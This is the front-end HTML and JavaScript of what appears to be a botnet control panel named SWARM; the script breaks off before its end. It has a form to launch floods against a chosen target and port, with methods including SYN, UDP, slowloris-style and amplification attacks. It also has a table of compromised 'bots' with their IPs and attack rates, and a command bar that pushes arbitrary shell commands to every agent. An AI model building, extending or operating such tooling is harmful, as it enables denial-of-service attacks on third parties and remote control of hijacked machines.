<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SWARM</title>
  <style>
    :root{
      --bg:#0b0e13; --panel:#11151c; --panel-alt:#0f131a; --border:#21262d; --primary:#c9d1d9;
      --muted:#8b949e; --accent:#1f6feb; --success:#2ea043; --danger:#da3633; --warn:#bb8009;
      --input:#0d1117; --chip:#10161e;
    }
    *{box-sizing:border-box}
    html,body{margin:0;background:var(--bg);color:var(--primary);font-family:ui-monospace,SFMono-Regular,Consolas,monospace;height:100%}
    body{line-height:1.35}
    a,button,input,select{font:inherit;font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
    button,input,select{background:var(--input);color:var(--primary);border:1px solid var(--border);border-radius:3px;min-height:30px;padding:6px 10px}
    button{cursor:pointer;text-transform:uppercase;letter-spacing:.08em;font-weight:700}
    button:hover{border-color:#37414d}
    button:focus-visible,input:focus-visible,select:focus-visible,.chip:focus-visible,.sortable:focus-visible,.row-btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
    input::placeholder{color:var(--muted)}
    .hidden{display:none !important}
    .app{max-width:1480px;margin:0 auto;padding:12px 10px 28px}
    .topbar{position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;gap:14px;background:rgba(17,21,28,.96);border:1px solid var(--border);padding:10px 14px;margin-bottom:12px}
    .brand-wrap{display:flex;align-items:center;gap:12px}
    .brand{font-size:1.15rem;letter-spacing:.4em;text-transform:uppercase;font-weight:700;white-space:nowrap}
    .mock-badge{padding:3px 6px;border:1px solid rgba(187,128,9,.7);background:rgba(187,128,9,.08);color:#f7d48f;font-size:9px;letter-spacing:.14em;text-transform:uppercase}
    .topbar-status{display:flex;align-items:center;gap:12px;flex-wrap:wrap;justify-content:flex-end}
    .conn-wrap{display:inline-flex;align-items:center;gap:8px;color:var(--muted);font-size:10px;letter-spacing:.14em;text-transform:uppercase}
    .dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:var(--success);box-shadow:0 0 0 3px rgba(46,160,67,.18)}
    .dot.red{background:var(--danger);box-shadow:0 0 0 3px rgba(218,54,51,.12)}
    .dot.amber{background:var(--warn);box-shadow:0 0 0 3px rgba(187,128,9,.12)}
    .stats{display:flex;align-items:center;gap:8px 18px;flex-wrap:wrap;color:var(--muted);font-size:12px;letter-spacing:.06em}
    .stat-value{color:var(--primary);font-weight:700}
    .stat-warn{color:var(--warn)}
    .countdown-ring{width:44px;height:44px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;position:relative;background:radial-gradient(circle at center,var(--panel) 0 58%,transparent 59%),conic-gradient(var(--accent) var(--pct),rgba(255,255,255,.04) 0)}
    .countdown-ring::before{content:"";position:absolute;inset:5px;border:1px solid var(--border);border-radius:50%;background:rgba(16,22,28,.8)}
    .countdown-ring span{position:relative;z-index:1;font-size:9px;letter-spacing:.08em}
    .panel{background:var(--panel);border:1px solid var(--border);border-radius:3px;padding:12px;margin-bottom:12px}
    .section-header{margin:0 0 10px;color:var(--muted);font-size:11px;letter-spacing:.18em;text-transform:uppercase;font-weight:700}
    .job-banner{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
    .job-main{display:flex;align-items:center;flex-wrap:wrap;gap:10px;flex:1;min-width:0}
    .method-badge{display:inline-block;padding:4px 8px;border:1px solid var(--border);border-radius:3px;background:rgba(31,111,235,.08);color:var(--primary);font-size:10px;letter-spacing:.14em;text-transform:uppercase;font-weight:700}
    .job-meta{display:flex;align-items:center;flex-wrap:wrap;gap:10px;color:var(--muted);font-size:12px}
    .job-meta strong{color:var(--primary);font-weight:700}
    .job-progress-wrap{width:min(420px,100%);display:flex;flex-direction:column;gap:5px;margin-top:6px}
    .job-progress{position:relative;height:8px;border:1px solid var(--border);background:rgba(255,255,255,.04);overflow:hidden;border-radius:2px}
    .job-progress>span{position:absolute;left:0;top:0;bottom:0;width:0;background:linear-gradient(90deg,var(--danger),#ff7f68)}
    .job-remaining{color:var(--muted);font-size:10px;text-transform:uppercase;letter-spacing:.12em}
    .idle-state{color:var(--muted);font-size:11px;letter-spacing:.18em;text-transform:uppercase}
    .fire-form{display:grid;gap:12px}
    .form-grid{display:grid;grid-template-columns:1.2fr 2.2fr .8fr .9fr .8fr .8fr;gap:10px}
    .field label{display:block;color:var(--muted);font-size:10px;letter-spacing:.14em;text-transform:uppercase;margin-bottom:6px}
    .field input,.field select{width:100%}
    .form-actions{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
    .btn-accent{background:var(--accent);border-color:var(--accent);color:#edf6ff}
    .btn-danger{background:var(--danger);border-color:var(--danger);color:#fff}
    .btn-neutral{background:#1a2029;border-color:var(--border);color:var(--primary)}
    .confirm-row{display:inline-flex;align-items:center;gap:8px;color:var(--muted);font-size:11px}
    .confirm-row input{width:14px;height:14px;margin:0}
    .inline-confirm{display:inline-block;padding:4px 8px;border-radius:3px;border:1px solid rgba(187,128,9,.5);color:var(--warn);background:rgba(187,128,9,.08);font-size:11px;letter-spacing:.08em;text-transform:uppercase}
    .duration-hint{font-size:11px;color:var(--muted);min-height:14px;letter-spacing:.08em}
    .command-wrap{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
    .command-wrap input{flex:1 1 360px;min-width:0}
    .chart-grid{display:grid;grid-template-columns:repeat(2,minmax(250px,1fr));gap:12px}
    .chart-panel{padding:10px;background:var(--panel);border:1px solid var(--border);border-radius:3px;min-height:195px}
    .chart-header{color:var(--muted);font-size:10px;letter-spacing:.18em;text-transform:uppercase;margin-bottom:8px}
    .chart-box{position:relative;width:100%;height:150px;background:rgba(255,255,255,.01);border:1px solid rgba(33,38,45,.8)}
    canvas{width:100% !important;height:100% !important;display:block}
    .fleet-head{display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;margin-bottom:8px}
    .filter-box{flex:1 1 220px;max-width:420px;min-width:160px}
    .chip-list{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
    .chip{padding:4px 8px;border:1px solid var(--border);background:transparent;color:var(--muted);border-radius:3px;cursor:pointer;display:inline-flex;align-items:center;gap:6px;font-size:10px;letter-spacing:.1em;text-transform:uppercase}
    .chip.active{background:rgba(31,111,235,.08);border-color:var(--accent);color:var(--primary)}
    .chip-count{display:inline-flex;min-width:18px;height:18px;padding:0 4px;align-items:center;justify-content:center;border-radius:2px;background:rgba(255,255,255,.04);color:var(--primary);font-size:10px}
    .fleet-meta{color:var(--muted);font-size:11px;letter-spacing:.08em;margin:4px 0 10px}
    .table-wrap{overflow:auto;border:1px solid var(--border);border-radius:3px;background:rgba(10,12,17,.25)}
    table{width:100%;border-collapse:collapse;table-layout:fixed;min-width:1180px}
    th,td{padding:0 8px;height:24px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;vertical-align:middle}
    th:last-child,td:last-child{border-right:none}
    thead th{position:sticky;top:0;z-index:2;background:rgba(17,21,28,.96);color:var(--muted);font-size:10px;letter-spacing:.16em;text-transform:uppercase;font-weight:700;user-select:none;cursor:pointer}
    tbody tr{background:rgba(17,21,28,.2)}
    tbody tr:hover{background:rgba(31,111,235,.04)}
    .bot-row{cursor:pointer}
    .bot-row.attack{color:#f4a6a6}
    .bot-row.idle{color:var(--primary)}
    .bot-row.dead{opacity:.45}
    .num{text-align:right;font-variant-numeric:tabular-nums}
    .row-btn{width:24px;min-width:24px;height:22px;padding:0;border:1px solid var(--border);background:rgba(218,54,51,.06);color:var(--danger);font-weight:700;text-transform:none;line-height:1}
    tr.detail-row td{background:rgba(13,17,23,.85);padding:8px 12px}
    .detail-json{margin:0;white-space:pre-wrap;color:var(--primary);font-size:11px;line-height:1.5}
    .event-log{max-height:260px;overflow:auto;border:1px solid var(--border);background:rgba(12,15,21,.6);border-radius:3px;padding:8px;display:flex;flex-direction:column;gap:6px;scroll-behavior:smooth}
    .event{display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(33,38,45,.7);font-size:11px;letter-spacing:.05em}
    .event:last-child{border-bottom:none}
    .event-time{color:var(--muted);min-width:64px;font-variant-numeric:tabular-nums}
    .event.success{color:#abefbe}
    .event.warn{color:#f0cd88}
    .event.error{color:#f2b7b7}
    .event.info{color:var(--primary)}
    .toast-host{position:fixed;right:18px;bottom:18px;display:flex;flex-direction:column;align-items:flex-end;gap:8px;z-index:120}
    .toast{max-width:min(360px,78vw);padding:8px 10px;border:1px solid var(--border);background:rgba(17,21,28,.98);color:var(--primary);font-size:12px;letter-spacing:.05em;border-radius:3px;animation:slideIn .2s ease}
    .toast.success{border-color:rgba(46,160,67,.5);background:rgba(14,27,18,.96);color:#d3f7d9}
    .toast.error{border-color:rgba(218,54,51,.5);background:rgba(31,17,18,.96);color:#f9d5d4}
    .toast.info{border-color:rgba(31,111,235,.5);background:rgba(13,24,38,.96);color:#dfeaff}
    @keyframes slideIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
    .token-banner{position:sticky;top:58px;z-index:60;padding:8px 12px;border:1px solid rgba(218,54,51,.5);background:rgba(218,54,51,.1);color:#ffd7d7;font-size:11px;letter-spacing:.18em;text-transform:uppercase;font-weight:700;margin-bottom:8px}
    @media (max-width:980px){.form-grid{grid-template-columns:repeat(2,minmax(150px,1fr))}.chart-grid{grid-template-columns:1fr}.topbar{align-items:flex-start}}
    @media (max-width:480px){.app{padding:8px 8px 24px}.topbar{padding:8px 10px}.brand{letter-spacing:.2em;font-size:1rem}.stats{gap:6px 10px;font-size:11px}.form-grid{grid-template-columns:1fr}.command-wrap{flex-direction:column;align-items:stretch}.command-wrap input{width:100%}table{min-width:980px}}
  </style>
</head>
<body>
  <div class="app">
    <div id="tokenBanner" class="token-banner hidden" aria-live="assertive">bad token</div>
    <header class="topbar" aria-label="dashboard header">
      <div class="brand-wrap">
        <div class="brand">SWARM</div>
        <div id="mockBadge" class="mock-badge hidden">MOCK</div>
      </div>
      <div class="topbar-status">
        <div class="conn-wrap">
          <span id="connDot" class="dot" aria-label="connection status"></span>
          <span>link</span>
        </div>
        <div class="stats">
          <div><span>online / total</span> <span id="onlineTotal" class="stat-value">0 / 0</span></div>
          <div><span>attacking</span> <span id="attackingStat" class="stat-value stat-warn">0</span></div>
          <div><span>pps</span> <span id="ppsStat" class="stat-value">0</span></div>
          <div><span>mb/s</span> <span id="mbpsStat" class="stat-value">0.0</span></div>
          <div><span>uptime</span> <span id="uptimeStat" class="stat-value">0d 0h 0m</span></div>
        </div>
        <div id="countdownRing" class="countdown-ring" aria-label="time until next refresh"><span id="countdownText">2000</span></div>
      </div>
    </header>

    <section class="panel" aria-label="job status">
      <div id="jobBanner" class="job-banner"></div>
    </section>

    <section class="panel" aria-label="fire form">
      <h2 class="section-header">fire</h2>
      <form id="fireForm" class="fire-form" novalidate>
        <div class="form-grid">
          <div class="field">
            <label for="methodSelect">method</label>
            <select id="methodSelect" name="method">
              <option value="http">http</option>
              <option value="httpk">httpk</option>
              <option value="udp">udp</option>
              <option value="tcp">tcp</option>
              <option value="mc">mc</option>
              <option value="mcjoin">mcjoin</option>
              <option value="mcpe">mcpe</option>
              <option value="slow">slow</option>
              <option value="syn">syn</option>
              <option value="amp">amp</option>
            </select>
          </div>
          <div class="field">
            <label for="targetInput">target</label>
            <input id="targetInput" name="target" type="text" placeholder="example.com" autocomplete="off">
          </div>
          <div class="field">
            <label for="portInput">port</label>
            <input id="portInput" name="port" type="number" min="1" max="65535" step="1" value="80">
          </div>
          <div class="field">
            <label for="durationInput">duration</label>
            <input id="durationInput" name="duration" type="text" value="60" inputmode="numeric" placeholder="60, 5m, 1h">
          </div>
          <div class="field">
            <label for="threadsInput">threads</label>
            <input id="threadsInput" name="threads" type="number" min="1" step="1" value="32">
          </div>
          <div class="field">
            <label for="procsInput">procs</label>
            <input id="procsInput" name="procs" type="number" min="1" step="1" value="1">
          </div>
        </div>
        <div class="form-actions">
          <button type="submit" class="btn-accent">fire</button>
          <button type="button" id="stopBtn" class="btn-danger">stop</button>
          <button type="button" id="updateBtn" class="btn-neutral">update all</button>
        </div>
        <div class="confirm-row">
          <input id="dontAskBox" type="checkbox">
          <label for="dontAskBox">don't ask</label>
        </div>
        <div id="fireInlineConfirm" class="inline-confirm hidden" aria-live="polite">replaces current job - click again</div>
        <div id="durationHint" class="duration-hint" aria-live="polite">resolved: 60s</div>
      </form>
    </section>

    <section class="panel" aria-label="command bar">
      <h2 class="section-header">command</h2>
      <form id="execForm" class="command-wrap" novalidate>
        <input id="commandInput" type="text" list="cmdHistory" placeholder="run command" autocomplete="off">
        <button type="submit" class="btn-accent">exec</button>
      </form>
      <datalist id="cmdHistory"></datalist>
    </section>

    <section class="chart-grid" aria-label="charts">
      <div class="chart-panel">
        <div class="chart-header">pps</div>
        <div class="chart-box"><canvas id="ppsCanvas" aria-label="pps chart"></canvas></div>
      </div>
      <div class="chart-panel">
        <div class="chart-header">mbps</div>
        <div class="chart-box"><canvas id="mbpsCanvas" aria-label="mbps chart"></canvas></div>
      </div>
    </section>

    <section class="panel" aria-label="fleet table">
      <div class="fleet-head">
        <div class="filter-box">
          <input id="fleetFilter" type="text" placeholder="filter by host, ip, id, os" aria-label="fleet filter">
        </div>
        <div id="stateChips" class="chip-list" aria-label="state filters"></div>
      </div>
      <div id="fleetMeta" class="fleet-meta">showing 0 of 0</div>
      <div class="table-wrap">
        <table aria-label="fleet table">
          <thead>
            <tr>
              <th data-key="id" class="sortable">id</th>
              <th data-key="host" class="sortable">host</th>
              <th data-key="os" class="sortable">os</th>
              <th data-key="ip" class="sortable">ip</th>
              <th data-key="state" class="sortable">state</th>
              <th data-key="pps" class="sortable num">pps</th>
              <th data-key="mbps" class="sortable num">mbps</th>
              <th data-key="cpu" class="sortable num">cpu</th>
              <th data-key="age" class="sortable num">age</th>
              <th data-key="up" class="sortable num">up</th>
              <th data-key="ver" class="sortable">ver</th>
              <th data-key="target" class="sortable">target</th>
              <th>kick</th>
            </tr>
          </thead>
          <tbody id="fleetBody"></tbody>
        </table>
      </div>
    </section>

    <section class="panel" aria-label="event log">
      <h2 class="section-header">event log</h2>
      <div id="eventLog" class="event-log" aria-live="polite"></div>
    </section>
  </div>

  <div id="toastHost" class="toast-host" aria-live="polite" aria-atomic="true"></div>

  <script>
    (() => {
      const FORM_KEY = 'swarm.form';
      const CMD_KEY = 'swarm.cmds';
      const REFRESH_MS = 2000;
      const BACKOFF_MS = 5000;
      const MAX_ROW_RENDER = 500;
      const MAX_LOG_LINES = 50;

      const state = {
        online:0,total:0,attacking:0,pps:0,mbps:0,uptime:0,truncated:0,job:null,bots:[],serverNow:0
      };
      const DEFAULT_FORM = {method:'http',target:'example.com',port:'80',duration:'60',threads:'32',procs:'1',dontAsk:false};
      let currentForm = {...DEFAULT_FORM};
      let refreshMs = REFRESH_MS;
      let requestSeq = 0;
      let inFlight = false;
      let refreshTimer = null;
      let sortKey = 'state';
      let sortDir = 1;
      let textFilter = '';
      let activeStateFilter = 'all';
      let expandedBotId = null;
      let fireConfirmMode = false;
      let badTokenShown = false;
      let mockMode = false;
      let eventLog = [];
      let lastSeenIds = new Set();
      let chartReady = false;
      let chartInstances = {};
      let fallbackCache = {};
      let serverClockOffset = 0;

      const ui = {
        tokenBanner: document.getElementById('tokenBanner'),
        mockBadge: document.getElementById('mockBadge'),
        connDot: document.getElementById('connDot'),
        onlineTotal: document.getElementById('onlineTotal'),
        attackingStat: document.getElementById('attackingStat'),
        ppsStat: document.getElementById('ppsStat'),
        mbpsStat: document.getElementById('mbpsStat'),
        uptimeStat: document.getElementById('uptimeStat'),
        countdownRing: document.getElementById('countdownRing'),
        countdownText: document.getElementById('countdownText'),
        jobBanner: document.getElementById('jobBanner'),
        methodSelect: document.getElementById('methodSelect'),
        targetInput: document.getElementById('targetInput'),
        portInput: document.getElementById('portInput'),
        durationInput: document.getElementById('durationInput'),
        threadsInput: document.getElementById('threadsInput'),
        procsInput: document.getElementById('procsInput'),
        dontAskBox: document.getElementById('dontAskBox'),
        fireInlineConfirm: document.getElementById('fireInlineConfirm'),
        durationHint: document.getElementById('durationHint'),
        fireForm: document.getElementById('fireForm'),
        execForm: document.getElementById('execForm'),
        commandInput: document.getElementById('commandInput'),
        cmdHistory: document.getElementById('cmdHistory'),
        fleetFilter: document.getElementById('fleetFilter'),
        stateChips: document.getElementById('stateChips'),
        fleetMeta: document.getElementById('fleetMeta'),
        fleetBody: document.getElementById('fleetBody'),
        eventLog: document.getElementById('eventLog'),
        toastHost: document.getElementById('toastHost'),
        stopBtn: document.getElementById('stopBtn'),
        updateBtn: document.getElementById('updateBtn')
      };

      function escapeHtml(v){return String(v ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
      function getToken(){const p=new URLSearchParams(location.search); return p.get('k') || '';}
      function buildApiUrl(path, extra={}){const url=new URL(path,location.origin);const params=new URLSearchParams(url.search);params.set('k',getToken());Object.entries(extra).forEach(([k,v])=>{if(v!==undefined && v!==null && v !== '') params.set(k,String(v));});url.search=params.toString();return url.toString();}
      function toast(type,msg,timeout=3500){const el=document.createElement('div');el.className='toast '+type;el.textContent=msg;ui.toastHost.appendChild(el);setTimeout(()=>el.remove(),timeout);}
      function setConnection(kind){ui.connDot.classList.remove('red','amber');if(kind==='red'){ui.connDot.classList.add('red');ui.connDot.setAttribute('aria-label','connection failed');}else if(kind==='amber'){ui.connDot.classList.add('amber');ui.connDot.setAttribute('aria-label','request in flight');}else{ui.connDot.setAttribute('aria-label','connection ok');}}
      function showBadToken(){if(badTokenShown) return;badTokenShown=true;ui.tokenBanner.classList.remove('hidden');ui.tokenBanner.textContent='bad token';toast('error','bad token');}
      function hideBadToken(){badTokenShown=false;ui.tokenBanner.classList.add('hidden');}
      function saveForm(){localStorage.setItem(FORM_KEY,JSON.stringify(currentForm));}
      function restoreForm(){let data={};try{data=JSON.parse(localStorage.getItem(FORM_KEY)||'{}');}catch(e){}currentForm={...DEFAULT_FORM,...data};ui.methodSelect.value=currentForm.method || 'http';ui.targetInput.value=currentForm.target || 'example.com';ui.portInput.value=currentForm.port || '80';ui.durationInput.value=currentForm.duration || '60';ui.threadsInput.value=currentForm.threads || '32';ui.procsInput.value=currentForm.procs || '1';ui.dontAskBox.checked=!!currentForm.dontAsk;updateDurationHint();}
      function updateDurationHint(){const resolved=parseDuration(ui.durationInput.value);ui.durationHint.textContent='resolved: '+resolved+'s';}
      function parseDuration(raw){const v=(raw||'').trim().toLowerCase();if(!v) return 60;if(/^\d+$/.test(v)) return Math.max(1,Number(v));const m=v.match(/^(\d+)([smh]?)$/);if(!m) return 60;const n=Number(m[1]);const u=m[2];if(u==='s'||u==='') return Math.max(1,n);if(u==='m') return Math.max(1,n*60);if(u==='h') return Math.max(1,n*3600);return 60;}
      function formatSecondsHuman(total){const t=Math.max(0, Number(total)||0);const d=Math.floor(t/86400);const h=Math.floor((t%86400)/3600);const m=Math.floor((t%3600)/60);return d+'d '+h+'h '+m+'m';}
      function formatPps(v){const n=Number(v)||0;if(n>=1000000) return (n/1000000).toFixed(2).replace(/\.00$/,'')+'M';if(n>=10000) return (n/1000).toFixed(1).replace(/\.0$/,'')+'k';if(n>=1000) return (n/1000).toFixed(2).replace(/\.00$/,'').replace(/\.0$/,'')+'k';return String(Math.round(n));}
      function formatMbps(v){return (Number(v)||0).toFixed(1);}
      function addEvent(level,msg){const stamp=new Date().toLocaleTimeString('en-GB',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'});eventLog.unshift({level,stamp,msg});if(eventLog.length>MAX_LOG_LINES) eventLog.length = MAX_LOG_LINES;renderEventLog();}
      function renderEventLog(){ui.eventLog.innerHTML=eventLog.map(e=>`<div class="event ${e.level}"><span class="event-time">${escapeHtml(e.stamp)}</span><span>${escapeHtml(e.msg)}</span></div>`).join('');ui.eventLog.scrollTop=0;}
      function renderTopBar(){ui.onlineTotal.textContent = state.online + ' / ' + state.total;ui.attackingStat.textContent = String(state.attacking || 0);ui.ppsStat.textContent = formatPps(state.pps || 0);ui.mbpsStat.textContent = formatMbps(state.mbps || 0);ui.uptimeStat.textContent = formatSecondsHuman(state.uptime || 0);const pct = Math.max(0,Math.min(100,(refreshMs/REFRESH_MS)*100));ui.countdownRing.style.setProperty('--pct', pct+'%');ui.countdownText.textContent = String(Math.round(refreshMs));}
      function renderJobBanner(){if(!state.job){ui.jobBanner.innerHTML='<div class="idle-state">idle</div>';return;}const job=state.job;const dur = Number(job.dur)||0;const serverNow = state.serverNow || (Date.now()/1000 + serverClockOffset/1000);const rem = Math.max(0, Number(job.until || 0) - serverNow);const elapsed = dur > 0 ? Math.max(0,Math.min(100,((dur-rem)/dur)*100)) : 0;ui.jobBanner.innerHTML = '<div class="job-main"><span class="method-badge">'+escapeHtml(job.method || 'job')+'</span><div class="job-meta"><span><strong>'+escapeHtml(job.target || 'unknown')+'</strong></span><span>port '+escapeHtml(job.port || 0)+'</span><span>threads '+escapeHtml(job.threads || 0)+'</span></div><div class="job-progress-wrap"><div class="job-progress"><span style="width:'+elapsed+'%"></span></div><div class="job-remaining">'+formatSecondsHuman(Math.ceil(rem))+'</div></div></div><button type="button" id="jobStopBtn" class="btn-danger">stop</button>';document.getElementById('jobStopBtn').addEventListener('click',handleStop);}
      function stateOrder(s){if(s==='attack') return 0; if(s==='idle') return 1; return 2;}
      function normalizeSort(v){if(v===null||v===undefined) return '';if(typeof v==='number') return v; if(typeof v==='string'){const s=v.toLowerCase();if(s==='attack') return 0; if(s==='idle') return 1; if(s==='dead') return 2; return s;} return String(v).toLowerCase();}
      function getFilteredBots(){const q=textFilter.trim().toLowerCase();return (state.bots || []).filter(bot=>{const s=(bot.state||'idle').toLowerCase();if(activeStateFilter!=='all' && s!==activeStateFilter) return false; if(!q) return true; const hay = [bot.host,bot.ip,bot.id,bot.os].join(' ').toLowerCase(); return hay.includes(q);});}
      function renderFleet(){const data=getFilteredBots();const sorted=[...data].sort((a,b)=>{if(sortKey==='state'){const oa=stateOrder((a.state||'idle').toLowerCase());const ob=stateOrder((b.state||'idle').toLowerCase());if(oa!==ob) return (oa-ob)*sortDir; const aa=Number(a.age||0); const bb=Number(b.age||0); return (aa-bb)*sortDir;} const av=normalizeSort(a[sortKey]); const bv=normalizeSort(b[sortKey]); if(av < bv) return -1*sortDir; if(av > bv) return 1*sortDir; return 0;});const limit=Math.min(MAX_ROW_RENDER, sorted.length);const visible=sorted.slice(0,limit);let meta='showing '+limit+' of '+sorted.length;if(state.truncated>0) meta += ', truncated '+state.truncated;ui.fleetMeta.textContent = meta;ui.fleetBody.innerHTML = visible.map(bot=>{const expanded = expandedBotId === bot.id; const s=(bot.state||'idle').toLowerCase(); return '<tr class="bot-row '+s+'" data-id="'+escapeHtml(bot.id)+'" tabindex="0"><td>'+escapeHtml(bot.id)+'</td><td>'+escapeHtml(bot.host||'')+'</td><td>'+escapeHtml(bot.os||'')+'</td><td>'+escapeHtml(bot.ip||'')+'</td><td>'+escapeHtml(s)+'</td><td class="num">'+escapeHtml(formatPps(bot.pps||0))+'</td><td class="num">'+escapeHtml(formatMbps(bot.mbps||0))+'</td><td class="num">'+escapeHtml(Number(bot.cpu||0).toFixed(2))+'</td><td class="num">'+escapeHtml(Number(bot.age||0))+'</td><td class="num">'+escapeHtml(Number(bot.up||0))+'</td><td>'+escapeHtml(bot.ver||'')+'</td><td>'+escapeHtml(bot.target||'')+'</td><td><button type="button" class="row-btn" data-kick-id="'+escapeHtml(bot.id)+'" aria-label="kick '+escapeHtml(bot.id)+'">x</button></td></tr>' + (expanded ? '<tr class="detail-row"><td colspan="13"><pre class="detail-json">'+escapeHtml(JSON.stringify(bot,null,2))+'</pre></td></tr>' : '');}).join('');ui.fleetBody.querySelectorAll('.row-btn').forEach(btn=>btn.addEventListener('click',ev=>{ev.stopPropagation();const id=btn.getAttribute('data-kick-id');kickBot(id);}));ui.fleetBody.querySelectorAll('.bot-row').forEach(row=>{row.addEventListener('click',ev=>{if(ev.target.closest('.row-btn')) return; const id=row.getAttribute('data-id'); expandedBotId = expandedBotId === id ? null : id; renderFleet();});row.addEventListener('keydown',ev=>{if(ev.key==='Enter'||ev.key===' '){ev.preventDefault();const id=row.getAttribute('data-id');expandedBotId = expandedBotId===id ? null : id; renderFleet();}});});}
      function renderStateChips(){const counts={all:0,idle:0,attack:0,dead:0};for(const bot of state.bots||[]){const s=(bot.state||'idle').toLowerCase();counts[s]=(counts[s]||0)+1;counts.all += 1;}ui.stateChips.innerHTML=['all','idle','attack','dead'].map(k=>'<button type="button" class="chip '+(activeStateFilter===k?'active':'')+'" data-state="'+k+'"><span>'+k+'</span><span class="chip-count">'+(counts[k]||0)+'</span></button>').join('');ui.stateChips.querySelectorAll('.chip').forEach(btn=>btn.addEventListener('click',()=>{activeStateFilter=btn.getAttribute('data-state');renderFleet();renderStateChips();}));}
      function saveCommandHistory(cmd){try{const raw=localStorage.getItem(CMD_KEY);const arr=raw?JSON.parse(raw):[];const list=Array.isArray(arr)?arr:[];const next=[cmd,...list.filter(x=>x!==cmd)].slice(0,5);localStorage.setItem(CMD_KEY,JSON.stringify(next));loadCommandHistory();}catch(e){}}
      function loadCommandHistory(){let list=[];try{const raw=localStorage.getItem(CMD_KEY);list=raw?JSON.parse(raw):[];list=Array.isArray(list)?list:[];}catch(e){}ui.cmdHistory.innerHTML=list.slice(0,5).map(v=>'<option value="'+escapeHtml(v)+'"></option>').join('');}
      function bindForm(){ui.fireForm.addEventListener('submit',ev=>{ev.preventDefault();fireAttack();});ui.targetInput.addEventListener('keydown',ev=>{if(ev.key==='Enter'){ev.preventDefault();fireAttack();}});ui.durationInput.addEventListener('input',updateDurationHint);ui.methodSelect.addEventListener('change',()=>{currentForm.method=ui.methodSelect.value;saveForm();});ui.targetInput.addEventListener('input',()=>{currentForm.target=ui.targetInput.value;saveForm();});ui.portInput.addEventListener('input',()=>{currentForm.port=ui.portInput.value;saveForm();});ui.durationInput.addEventListener('input',()=>{currentForm.duration=ui.durationInput.value;saveForm();});ui.threadsInput.addEventListener('input',()=>{currentForm.threads=ui.threadsInput.value;saveForm();});ui.procsInput.addEventListener('input',()=>{currentForm.procs=ui.procsInput.value;saveForm();});ui.dontAskBox.addEventListener('change',()=>{currentForm.dontAsk=ui.dontAskBox.checked;saveForm();});ui.stopBtn.addEventListener('click',handleStop);ui.updateBtn.addEventListener('click',handleUpdate);ui.execForm.addEventListener('submit',ev=>{ev.preventDefault();runExec();});}
      function fireAttack(){const target=(ui.targetInput.value||'').trim();if(!target){toast('error','target required');ui.targetInput.focus();return;}if(state.job && !ui.dontAskBox.checked && !fireConfirmMode){fireConfirmMode=true;ui.fireInlineConfirm.classList.remove('hidden');toast('info','replaces current job - click again');return;}fireConfirmMode=false;ui.fireInlineConfirm.classList.add('hidden');const dur=parseDuration(ui.durationInput.value);const params={method:ui.methodSelect.value,target,port:ui.portInput.value,dur,threads:ui.threadsInput.value,procs:ui.procsInput.value};fetch(buildApiUrl('/api/fire',params)).then(async res=>{if(!res.ok){const s=res.status||0;toast('error','HTTP '+s);if(res.status===401) showBadToken();throw new Error(String(s));} return res.json();}).then(data=>{if(data&&data.ok){toast('success','fire ok');addEvent('success','fire '+ui.methodSelect.value+' '+target);ui.targetInput.focus();}}).catch(err=>{if(String(err.message)!=='401'){console.error('fire failed',err);}});}
      function handleStop(){fetch(buildApiUrl('/api/stop')).then(async res=>{if(!res.ok){const s=res.status||0;if(res.status===401) showBadToken();else toast('error','HTTP '+s);throw new Error(String(s));}return res.json();}).then(data=>{if(data&&data.ok){toast('success','stopped');addEvent('warn','stop');}}).catch(err=>{if(String(err.message)!=='401') console.error('stop failed',err);});}
      function handleUpdate(){fetch(buildApiUrl('/api/update')).then(async res=>{if(!res.ok){const s=res.status||0;if(res.status===401) showBadToken();else toast('error','HTTP '+s);throw new Error(String(s));}return res.json();}).then(data=>{if(data&&data.ok){toast('success','updated '+(data.pushed || 0));addEvent('info','update all');}}).catch(err=>{if(String(err.message)!=='401') console.error('update failed',err);});}
      function runExec(){const cmd=(ui.commandInput.value||'').trim();if(!cmd){toast('error','command required');ui.commandInput.focus();return;}saveCommandHistory(cmd);fetch(buildApiUrl('/api/exec',{cmd})).then(async res=>{if(!res.ok){const s=res.status||0;if(res.status===401) showBadToken();else toast('error','HTTP '+s);throw new Error(String(s));}return res.json();}).then(data=>{if(data&&data.ok){toast('success','sent to '+(data.pushed || 0)+' agents');addEvent('success','exec '+cmd);ui.commandInput.value='';}}).catch(err=>{if(String(err.message)!=='401') console.error('exec failed',err);});}
      function kickBot(id){if(!id) return;fetch(buildApiUrl('/api/kick',{id})).then(async res=>{if(!res.ok){const s=res.status||0;if(res.status===401) showBadToken();else toast('error','HTTP '+s);throw new Error(String(s));}return res.json();}).then(data=>{if(data&&data.ok){toast('success','kicked '+id);addEvent('warn','kick '+id);}}).catch(err=>{if(String(err.message)!=='401') console.error('kick failed',err);});}
      function setNextRefresh(ms){refreshMs=ms;renderTopBar();if(refreshTimer) clearTimeout(refreshTimer);refreshTimer=setTimeout(()=>{if(document.hidden){setNextRefresh(REFRESH_MS);return;}fetchState();},ms);}
